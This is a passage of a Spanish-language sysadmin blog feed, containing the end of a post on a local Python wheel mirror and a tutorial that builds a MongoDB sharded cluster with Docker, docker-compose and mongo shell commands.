    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 102kB &lt;span class="m"&gt;6&lt;/span&gt;.6MB/s 
Collecting pymongo&amp;gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.7.1 &lt;span class="o"&gt;(&lt;/span&gt;from mongoengine&lt;span class="o"&gt;)&lt;/span&gt;
  Downloading http://172.17.0.1:8080/packages/pymongo-3.6.1-cp27-none-linux_x86_64.whl &lt;span class="o"&gt;(&lt;/span&gt;256kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 266kB &lt;span class="m"&gt;9&lt;/span&gt;.0MB/s 
Collecting six &lt;span class="o"&gt;(&lt;/span&gt;from mongoengine&lt;span class="o"&gt;)&lt;/span&gt;
  Downloading http://172.17.0.1:8080/packages/six-1.11.0-py2.py3-none-any.whl
Installing collected packages: pymongo, six, mongoengine
Successfully installed mongoengine-0.15.0 pymongo-3.6.1 six-1.11.0
root@stormy:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Siempre y cuando utilizen los mismos tipos de CPU y versiones de &lt;strong&gt;python&lt;/strong&gt;, pueden utilizar los mismos &lt;em&gt;wheels&lt;/em&gt;. Eso nos evita compilarlos y reduce notoriamente el tiempo de red invertido en descargarlos.&lt;/p&gt;</content><category term="python"></category><category term="PyPI"></category><category term="wheel"></category><category term="docker"></category></entry><entry><title>MongoDB sharding con docker</title><link href="http://www.linuxsysadmin.ml/2018/07/mongodb-sharding-con-docker.html" rel="alternate"></link><published>2018-07-02T09:00:00+02:00</published><updated>2018-07-02T09:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-07-02:/2018/07/mongodb-sharding-con-docker.html</id><summary type="html">&lt;p&gt;El otro día estaba revisando viejos artículos, y me tropecé con &lt;a href="http://www.linuxsysadmin.ml/2016/05/mongodb-sharding-con-ansible.html"&gt;uno anterior&lt;/a&gt;. Este estaba montado con &lt;strong&gt;ansible&lt;/strong&gt;, y se me pasó por la cabeza reescribirlo usando contenedores con &lt;strong&gt;docker&lt;/strong&gt;. Así pues, vamos a montar exactamente el mismo &lt;em&gt;cluster&lt;/em&gt;, pero con el cambio que la última revolución tecnológica nos aporta …&lt;/p&gt;</summary><content type="html">&lt;p&gt;El otro día estaba revisando viejos artículos, y me tropecé con &lt;a href="http://www.linuxsysadmin.ml/2016/05/mongodb-sharding-con-ansible.html"&gt;uno anterior&lt;/a&gt;. Este estaba montado con &lt;strong&gt;ansible&lt;/strong&gt;, y se me pasó por la cabeza reescribirlo usando contenedores con &lt;strong&gt;docker&lt;/strong&gt;. Así pues, vamos a montar exactamente el mismo &lt;em&gt;cluster&lt;/em&gt;, pero con el cambio que la última revolución tecnológica nos aporta.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Sharded cluster" src="http://www.linuxsysadmin.ml/images/sharding_arquitectura_logica.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Aunque lo ideal sería desplegar todas las instancias en varias máquinas diferentes, voy a pasar; por comodidad, voy a desplegar todos los contenedores en una sola máquina mediante &lt;strong&gt;docker-compose&lt;/strong&gt;. De esta forma puedo aprovechar las mismas imágenes sin una ocupación de disco elevada.&lt;/p&gt;
&lt;p&gt;Como de costumbre, vamos a crear una carpeta para contener el proyecto y la vamos a llamar &lt;code&gt;sharding&lt;/code&gt;. En ella voy a depositar los ficheros &lt;code&gt;Dockerfile&lt;/code&gt; necesarios para la construcción de las imágenes, y de paso, el &lt;code&gt;docker-compose.yml&lt;/code&gt; y las configuraciones que vamos a montar como volúmenes.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/sharding$ tree
.
├── build
│   ├── mongo
│   │   └── Dockerfile
│   ├── mongod
│   │   └── Dockerfile
│   └── mongos
│       └── Dockerfile
├── docker-compose.yml
├── mongod_aquila.conf
├── mongod_config.conf
├── mongod_cygnus.conf
├── mongod_lyra.conf
└── mongos.conf

&lt;span class="m"&gt;4&lt;/span&gt; directories, &lt;span class="m"&gt;9&lt;/span&gt; files
gerard@sirius:~/workspace/sharding$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Construyendo las imágenes&lt;/h2&gt;
&lt;p&gt;El primer paso para levantar el entorno son las imágenes que lo sostienen. Necesitamos 3 imágenes: una para el proceso &lt;code&gt;mongod&lt;/code&gt; (que sostiene los &lt;em&gt;shards&lt;/em&gt; y los &lt;em&gt;config server&lt;/em&gt;), una para el proceso &lt;code&gt;mongos&lt;/code&gt; (punto de entrada al &lt;em&gt;cluster&lt;/em&gt;) y otra para el cliente &lt;code&gt;mongo&lt;/code&gt; (que nos sirve para atar el &lt;em&gt;cluster&lt;/em&gt;).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/sharding$ cat build/mongod/Dockerfile 
FROM alpine:3.7
RUN apk add --no-cache mongodb &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /usr/bin/mongo /usr/bin/mongos /usr/bin/mongoperf &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    install -d -o mongodb -g mongodb -m &lt;span class="m"&gt;0755&lt;/span&gt; /srv/mongodb
USER mongodb
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/bin/mongod&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--config&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;/etc/mongod.conf&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/workspace/sharding$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/sharding$ cat build/mongos/Dockerfile 
FROM alpine:3.7
RUN apk add --no-cache mongodb &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /usr/bin/mongo /usr/bin/mongod /usr/bin/mongoperf
USER mongodb
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/bin/mongos&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--config&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;/etc/mongos.conf&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/workspace/sharding$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/sharding$ cat build/mongo/Dockerfile 
FROM alpine:3.7
RUN apk add --no-cache mongodb &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /usr/bin/mongod /usr/bin/mongos /usr/bin/mongoperf
USER mongodb
gerard@sirius:~/workspace/sharding$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos queda construirlas usando los comandos habituales:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/sharding$ docker build -t mongo-server build/mongod/
...
Successfully tagged mongo-server:latest
gerard@sirius:~/workspace/sharding$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/sharding$ docker build -t mongo-proxy build/mongos/
...
Successfully tagged mongo-proxy:latest
gerard@sirius:~/workspace/sharding$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/sharding$ docker build -t mongo-client build/mongo/
...
Successfully tagged mongo-client:latest
gerard@sirius:~/workspace/sharding$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Levantando todos los procesos&lt;/h2&gt;
&lt;p&gt;La parte más tediosa de levantar un &lt;em&gt;cluster&lt;/em&gt; es levantar todos los procesos implicados. En el caso del &lt;em&gt;cluster&lt;/em&gt; de ejemplo, necesitamos un mínimo de 13 procesos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1 &lt;code&gt;mongos&lt;/code&gt; o más para poder utilizar e &lt;em&gt;cluster&lt;/em&gt; de forma transparente&lt;/li&gt;
&lt;li&gt;3 &lt;code&gt;mongod&lt;/code&gt; en configuración de &lt;em&gt;replica set&lt;/em&gt; para actuar como &lt;em&gt;config servers&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;3 &lt;code&gt;mongod&lt;/code&gt; en configuración de &lt;em&gt;replica set&lt;/em&gt; para actuar como el &lt;em&gt;shard aquila&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;3 &lt;code&gt;mongod&lt;/code&gt; en configuración de &lt;em&gt;replica set&lt;/em&gt; para actuar como el &lt;em&gt;shard lyra&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;3 &lt;code&gt;mongod&lt;/code&gt; en configuración de &lt;em&gt;replica set&lt;/em&gt; para actuar como el &lt;em&gt;shard cygnus&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;El contenedor para ejecutar el cliente &lt;code&gt;mongo&lt;/code&gt; no es necesario; lo normal es que cada aplicación consuma directamente los procesos &lt;code&gt;mongos&lt;/code&gt; utilizando el &lt;em&gt;driver&lt;/em&gt;. Para operar el &lt;em&gt;cluster&lt;/em&gt; vamos a levantar el cliente de forma puntual, eliminando el contenedor al acabar.&lt;/p&gt;
&lt;p&gt;Para facilitar el levantado de procesos, vamos a utilizar &lt;strong&gt;docker-compose&lt;/strong&gt;; aquí os dejo el fichero &lt;code&gt;docker-compose.yml&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/sharding$ cat docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;3&amp;#39;&lt;/span&gt;
services:
  mongos01:
    image: mongo-proxy
    container_name: mongos01
    hostname: mongos01
    volumes:
      - ./mongos.conf:/etc/mongos.conf:ro
    restart: always
  config01:
    image: mongo-server
    container_name: config01
    hostname: config01
    volumes:
      - ./mongod_config.conf:/etc/mongod.conf:ro
    restart: always
  config02:
    image: mongo-server
    container_name: config02
    hostname: config02
    volumes:
      - ./mongod_config.conf:/etc/mongod.conf:ro
    restart: always
  config03:
    image: mongo-server
    container_name: config03
    hostname: config03
    volumes:
      - ./mongod_config.conf:/etc/mongod.conf:ro
    restart: always
  aquila01:
    image: mongo-server
    container_name: aquila01
    hostname: aquila01
    volumes:
      - ./mongod_aquila.conf:/etc/mongod.conf:ro
    restart: always
  aquila02:
    image: mongo-server
    container_name: aquila02
    hostname: aquila02
    volumes:
      - ./mongod_aquila.conf:/etc/mongod.conf:ro
    restart: always
  aquila03:
    image: mongo-server
    container_name: aquila03
    hostname: aquila03
    volumes:
      - ./mongod_aquila.conf:/etc/mongod.conf:ro
    restart: always
  lyra01:
    image: mongo-server
    container_name: lyra01
    hostname: lyra01
    volumes:
      - ./mongod_lyra.conf:/etc/mongod.conf:ro
    restart: always
  lyra02:
    image: mongo-server
    container_name: lyra02
    hostname: lyra02
    volumes:
      - ./mongod_lyra.conf:/etc/mongod.conf:ro
    restart: always
  lyra03:
    image: mongo-server
    container_name: lyra03
    hostname: lyra03
    volumes:
      - ./mongod_lyra.conf:/etc/mongod.conf:ro
    restart: always
  cygnus01:
    image: mongo-server
    container_name: cygnus01
    hostname: cygnus01
    volumes:
      - ./mongod_cygnus.conf:/etc/mongod.conf:ro
    restart: always
  cygnus02:
    image: mongo-server
    container_name: cygnus02
    hostname: cygnus02
    volumes:
      - ./mongod_cygnus.conf:/etc/mongod.conf:ro
    restart: always
  cygnus03:
    image: mongo-server
    container_name: cygnus03
    hostname: cygnus03
    volumes:
      - ./mongod_cygnus.conf:/etc/mongod.conf:ro
    restart: always
gerard@sirius:~/workspace/sharding$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: Es importante que el &lt;em&gt;hostname&lt;/em&gt; y el &lt;em&gt;container_name&lt;/em&gt; sean el mismo; las &lt;em&gt;replicas&lt;/em&gt; utilizan el &lt;em&gt;hostname&lt;/em&gt; para su descubrimiento, pero el &lt;em&gt;container_name&lt;/em&gt; al conectarse entre ellas.&lt;/p&gt;
&lt;p&gt;Cada elemento dentro del &lt;em&gt;cluster&lt;/em&gt; necesita un parámetro &lt;code&gt;replSetName&lt;/code&gt; indicando el nombre de la &lt;em&gt;replica set&lt;/em&gt; a la que pertenecen. Otro parámetro cambiante es el &lt;code&gt;clusterRole&lt;/code&gt;, dependiendo si la &lt;em&gt;replica set&lt;/em&gt; va a ejercer como &lt;em&gt;config server&lt;/em&gt; o como &lt;em&gt;shard&lt;/em&gt;. Los miembros del mismo &lt;em&gt;replica set&lt;/em&gt; comparten configuración, así que solo necesitamos 4 distintas.&lt;/p&gt;
&lt;p&gt;Empezaremos exponiendo la configuración de los &lt;em&gt;config server&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/sharding$ cat mongod_config.conf 
processManagement:
  fork: &lt;span class="nb"&gt;false&lt;/span&gt;

net:
  bindIp: &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0
  port: &lt;span class="m"&gt;27019&lt;/span&gt;
  unixDomainSocket:
    enabled: &lt;span class="nb"&gt;false&lt;/span&gt;

storage:
  dbPath: /srv/mongodb
  engine: wiredTiger
  journal:
    enabled: &lt;span class="nb"&gt;true&lt;/span&gt;

replication:
  replSetName: config

sharding:
  clusterRole: configsvr
gerard@sirius:~/workspace/sharding$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La configuración de los &lt;em&gt;shards&lt;/em&gt; es prácticamente la misma; solo hace falta cambiar el &lt;code&gt;clusterRole&lt;/code&gt; el &lt;code&gt;replSetName&lt;/code&gt; y el puerto usado. Empezaremos exponiendo la configuración del primer &lt;em&gt;shard&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/sharding$ cat mongod_aquila.conf 
processManagement:
  fork: &lt;span class="nb"&gt;false&lt;/span&gt;

net:
  bindIp: &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0
  port: &lt;span class="m"&gt;27018&lt;/span&gt;
  unixDomainSocket:
    enabled: &lt;span class="nb"&gt;false&lt;/span&gt;

storage:
  dbPath: /srv/mongodb
  engine: wiredTiger
  journal:
    enabled: &lt;span class="nb"&gt;true&lt;/span&gt;

replication:
  replSetName: aquila

sharding:
  clusterRole: shardsvr
gerard@sirius:~/workspace/sharding$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: El &lt;em&gt;cluster&lt;/em&gt; original ponía el árbitro en otro puerto para poder ir a la misma máquina. Esto ya no es necesario con &lt;strong&gt;docker&lt;/strong&gt; y nos ahorra poner una configuración nueva.&lt;/p&gt;
&lt;p&gt;Los otros &lt;em&gt;shards&lt;/em&gt; son prácticamente iguales, cambiando solamente el nombre de la &lt;em&gt;replica set&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/sharding$ diff mongod_aquila.conf mongod_lyra.conf 
17c17
&amp;lt;   replSetName: aquila
---
&amp;gt;   replSetName: lyra
gerard@sirius:~/workspace/sharding$ diff mongod_aquila.conf mongod_cygnus.conf 
17c17
&amp;lt;   replSetName: aquila
---
&amp;gt;   replSetName: cygnus
gerard@sirius:~/workspace/sharding$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto tenemos todo lo necesario para levantar los procesos, así que no lo demoramos más.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/sharding$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;sharding_default&amp;quot;&lt;/span&gt; with the default driver
Creating cygnus03
Creating config03
Creating mongos01
Creating aquila02
Creating lyra03
Creating cygnus02
Creating cygnus01
Creating config01
Creating lyra01
Creating aquila03
Creating lyra02
Creating config02
Creating aquila01
gerard@sirius:~/workspace/sharding$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Atando el cluster&lt;/h2&gt;
&lt;p&gt;Para atar completamente el &lt;em&gt;cluster&lt;/em&gt; se necesita hacer dos cosas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Atar los &lt;em&gt;replica sets&lt;/em&gt; que conformarán los &lt;em&gt;shards&lt;/em&gt; y los &lt;em&gt;config server&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Añadir los &lt;em&gt;shards&lt;/em&gt; ya atados a través de un &lt;em&gt;mongos&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Estas tareas administrativas requieren de un cliente &lt;code&gt;mongo&lt;/code&gt; que no queremos tener de forma permanente, así que tendremos un contenedor de "usar y tirar". De esta forma, cuando acabemos lo destruiremos y no tendremos partes innecesarias.&lt;/p&gt;
&lt;p&gt;Levantar un contenedor con la imagen que contiene el cliente &lt;code&gt;mongo&lt;/code&gt; no tiene misterio. El único detalle es que lo vamos a añadir a la misma red que creó el &lt;em&gt;docker-compose.yml&lt;/em&gt;; eso nos garantiza que podamos usar los &lt;em&gt;container_name&lt;/em&gt; en vez de ir buscando las direcciones IP de cada contenedor.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/sharding$ docker run -ti --rm --net sharding_default mongo-client
/ $ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: A partir de aquí todos los comandos se hacen en el &lt;em&gt;shell&lt;/em&gt; de &lt;em&gt;alpine linux&lt;/em&gt;. Desde esta sesión interactiva, vamos a ir abriendo sesiones de &lt;em&gt;mongo shell&lt;/em&gt; contra los procesos &lt;code&gt;mongod&lt;/code&gt; o &lt;code&gt;mongos&lt;/code&gt; que nos haga falta.&lt;/p&gt;
&lt;p&gt;Atar los &lt;em&gt;replica sets&lt;/em&gt; es siempre igual: entramos en uno de los miembros y le damos una configuración; otra opción es iniciar uno solo de los miembros y añadir los otros.&lt;/p&gt;
&lt;p&gt;Empezaremos con los &lt;em&gt;config servers&lt;/em&gt;, que a partir de la versión 3.2 de &lt;strong&gt;mongodb&lt;/strong&gt; pueden ser &lt;em&gt;replica sets&lt;/em&gt;, y que deben serlo a partir de la versión 3.4 (la que usamos). Entraremos en &lt;em&gt;config01&lt;/em&gt; y lo inicializamos, para añadir los otros dos en el mismo &lt;em&gt;mongo shell&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/ $ mongo --host config01 --port &lt;span class="m"&gt;27019&lt;/span&gt;
...
&amp;gt; rs.initiate&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;info2&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;no configuration specified. Using a default configuration for the set&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;me&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;config01:27019&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
config:PRIMARY&amp;gt; rs.add&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;config02:27019&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
config:PRIMARY&amp;gt; rs.add&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;config03:27019&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
config:PRIMARY&amp;gt; &lt;span class="nb"&gt;exit&lt;/span&gt;
bye
/ $ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: Los &lt;em&gt;replica sets&lt;/em&gt; destinados a ser &lt;em&gt;config servers&lt;/em&gt; no pueden contener árbitros; si lo intentáis, obtendréis un bonito mensaje de error, pero no habrá consecuencias.&lt;/p&gt;
&lt;p&gt;Repetiremos la fórmula para cada uno de los otros &lt;em&gt;shards&lt;/em&gt;; entramos en el primer contenedor de cada &lt;em&gt;shard&lt;/em&gt;, donde lo inicializamos y añadimos los otros dos. Para ser fieles al artículo original, el tercer contenedor de cada &lt;em&gt;shard&lt;/em&gt; será un árbitro.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/ $ mongo --host aquila01 --port &lt;span class="m"&gt;27018&lt;/span&gt;
...
&amp;gt; rs.initiate&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;info2&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;no configuration specified. Using a default configuration for the set&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;me&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;aquila01:27018&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
aquila:PRIMARY&amp;gt; rs.add&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;aquila02:27018&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
aquila:PRIMARY&amp;gt; rs.addArb&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;aquila03:27018&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
aquila:PRIMARY&amp;gt; &lt;span class="nb"&gt;exit&lt;/span&gt;
bye
/ $ 
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/ $ mongo --host lyra01 --port &lt;span class="m"&gt;27018&lt;/span&gt;
...
&amp;gt; rs.initiate&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;info2&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;no configuration specified. Using a default configuration for the set&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;me&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;lyra01:27018&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
lyra:PRIMARY&amp;gt; rs.add&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;lyra02:27018&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
lyra:PRIMARY&amp;gt; rs.addArb&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;lyra03:27018&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
lyra:PRIMARY&amp;gt; &lt;span class="nb"&gt;exit&lt;/span&gt;
bye
/ $ 
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/ $ mongo --host cygnus01 --port &lt;span class="m"&gt;27018&lt;/span&gt;
...
&amp;gt; rs.initiate&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;info2&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;no configuration specified. Using a default configuration for the set&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;me&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;cygnus01:27018&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
cygnus:PRIMARY&amp;gt; rs.add&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;cygnus02:27018&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
cygnus:PRIMARY&amp;gt; rs.addArb&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;cygnus03:27018&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
cygnus:PRIMARY&amp;gt; &lt;span class="nb"&gt;exit&lt;/span&gt;
bye
/ $ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora tenemos 4 &lt;em&gt;replica sets&lt;/em&gt;, uno configurado como &lt;em&gt;config server&lt;/em&gt; y apuntado por el proceso &lt;code&gt;mongos&lt;/code&gt;, y otros 3 que serán los &lt;em&gt;shards&lt;/em&gt;. Vamos a iniciar un &lt;em&gt;mongo shell&lt;/em&gt; contra el proceso &lt;code&gt;mongos&lt;/code&gt;, desde donde vamos a acabar las configuraciones.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/ $ mongo --host mongos01 --port &lt;span class="m"&gt;27017&lt;/span&gt;
...
mongos&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De hecho, en este punto ya tenemos un &lt;em&gt;cluster&lt;/em&gt; funcional, pero como no tiene &lt;em&gt;shards&lt;/em&gt;, no hay donde guardar datos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mongos&amp;gt; sh.status&lt;span class="o"&gt;()&lt;/span&gt;
--- Sharding Status --- 
  sharding version: &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;minCompatibleVersion&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;5&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;currentVersion&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;6&lt;/span&gt;,
